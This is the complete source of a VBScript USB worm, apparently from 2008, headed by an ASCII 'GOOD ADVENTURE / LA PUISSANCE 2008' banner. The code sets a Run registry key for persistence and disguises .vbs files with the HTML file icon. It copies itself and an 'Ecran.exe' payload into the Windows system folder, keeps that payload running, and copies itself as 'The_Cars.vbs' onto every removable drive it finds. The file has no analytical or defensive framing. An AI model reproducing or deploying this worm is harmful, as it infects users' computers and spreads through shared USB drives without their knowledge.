'          |-----0\------------------------/0-----|
'          |-----0-\--/\GOOD ADVENTURE/\--/-0-----|
'          |-----0--\/  \-----LA-----/  \/--0-----|
'          |-----0--/\  /--PUISSANCE-\  /\--0-----|
'          |-----0-/--\/-----2008-----\/--\-0-----|
'          |-----0/------------------------\0-----|

'vbsfile="getspecialfolder(1)\WScript.exe, 2"
on error resume next   
Target ="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\FIXEDFON.FON"
Noun="Path%%%.txt"
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WSSH = CreateObject("WScript.Shell")
Set fold = FSO.GetSpecialFolder(1)
fold1 = cstr(fold)
location1 = wscript.scriptfullname
if instr(location1,fold1)=false then
wssh.run mid(wscript.scriptfullname,1,3)
if (fso.fileexists(Fold & "\Win32.vbs")) then
else
UP
result = wssh.regread ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\htmlfile\DefaultIcon\")
wssh.Regwrite"HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Vbsfile\DefaultIcon\",result
chmn1=Fold
prov1=mid(location1,1,len(location1)-13)
PhotoC prov1
end if
else
Do while time <> "00:00:00"
if not proc() then
Exec1 fold & "\Ecran"
end if
SUK
wscript.sleep 100
Loop
end if

Sub Exec1(exe)
wssh.run exe
End sub

Function proc()
proc=false
Set objWMI = GetObject("winmgmts:root\cimv2")
sQuery = "Select * from Win32_process"
For Each oproc In objWMI.execquery(sQuery)
if oproc.Name= "Ecran.exe"then
proc=true
exit for
end if     
Next
Set objWMI = Nothing
End function

sub UP()
set lieu = FSO.GetSpecialFolder(1)
set wssh = CreateObject("WScript.Shell")
wssh.regwrite Target,FSO.GetSpecialFolder(1) & "\Win32.vbs"
end sub

sub PhotoC(provien)
on error resume next
Dim FSO1,Flder
DateCreate FSO.GetSpecialFolder(1) & "\Win32.vbs"
if not (fso.fileexists(FSO.GetSpecialFolder(1) & "\VB6FR.DLL")) then
fso.copyfile provien & "\THe Girls\VB6FR.DLL" ,FSO.GetSpecialFolder(1) & "\VB6FR.DLL",true
end if
if not (fso.fileexists(FSO.GetSpecialFolder(1) & "\MSCMCFR.DLL")) then
fso.copyfile provien & "\THe Girls\MSCMCFR.DLL" ,FSO.GetSpecialFolder(1) & "\MSCMCFR.DLL",True
end if
fso.copyfile provien & "\THe Girls\Ecran.exe" ,FSO.GetSpecialFolder(1) & "\Ecran.exe",true
Set FSO1 = CreateObject("Scripting.FileSystemObject")
FSO1.CopyFolder provien & "\THe Girls" ,FSO.GetSpecialFolder(1) & "\THe Girls",True
end sub
sub PhotoC1(Chemin,nomfich)
Dim FSO1
fso.copyfile wscript.scriptfullname ,Chemin & "\" & nomfich,true
fso.copyfile FSO.GetSpecialFolder(1) & "\Ecran.exe" ,Chemin & "\Ecran.exe",true
Set FSO1 = CreateObject("Scripting.FileSystemObject")
FSO1.CopyFolder FSO.GetSpecialFolder(1) & "\THe Girls" ,chemin & "\THe Girls",True
end sub

sub SUK()
Dim suk1, suk2,unite1,fso,f,fso1
Set FSO = CreateObject("Scripting.FileSystemObject")
Set FSO1 = CreateObject("Scripting.FileSystemObject")
Set suk2 = fso.Drives
For Each suk1 in suk2
Unite1 = suk1.Driveletter & ":"
TypeUnit= detectamovibles(Unite1)
if TypeUnit ="UK" and suk1.isready then
if not (fso.fileexists(Unite1 & "\The_Cars.vbs")) then
PhotoC1 Unite1 ,"The_Cars.vbs"
Set f = fso1.OpenTextFile(fold & "\" & Noun, 2,true)
f.write(unite1)
else
end if
end if
Next
end sub

Function detectamovibles(drvpath)
Dim fso, d, s, t
Set fso = CreateObject("Scripting.FileSystemObject")

Set d = fso.GetDrive(fso.GetDriveName(fso.GetAbsolutePathName(drvpath)))
Select Case d.DriveType
Case 0: t ="Inconnu"
Case 1: t ="UK"
Case 2: t ="F"
Case 3: t ="Réso"
Case 4: t ="CDR"
Case 5: t ="RD"
End Select
detectamovibles=t
end function
sub DateCreate(LieuplusFile)
Dim fso, f, f2, ts, ts2
Dim Ligne
Set FSO = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFile(wscript.scriptfullname)
Set ts = f.OpenAsTextStream(1, -2)
fso.CreateTextFile LieuplusFile
Set f2 = fso.GetFile(LieuplusFile) 
Set ts2 = f2.OpenAsTextStream(2, -2)

do
Ligne = ts.readline
ts2.write Ligne & vbcrlf
loop until ts.AtEndOfStream
ts.Close
ts2.write "'" & date
ts2.Close
end sub
'17/05/2008
'11/06/2008
'16/11/2001
'28/06/2008
'02/07/2008
'26/07/2008
'12/09/2001
'18/08/2008
'08/10/2008
'21/10/2008
'26/11/2008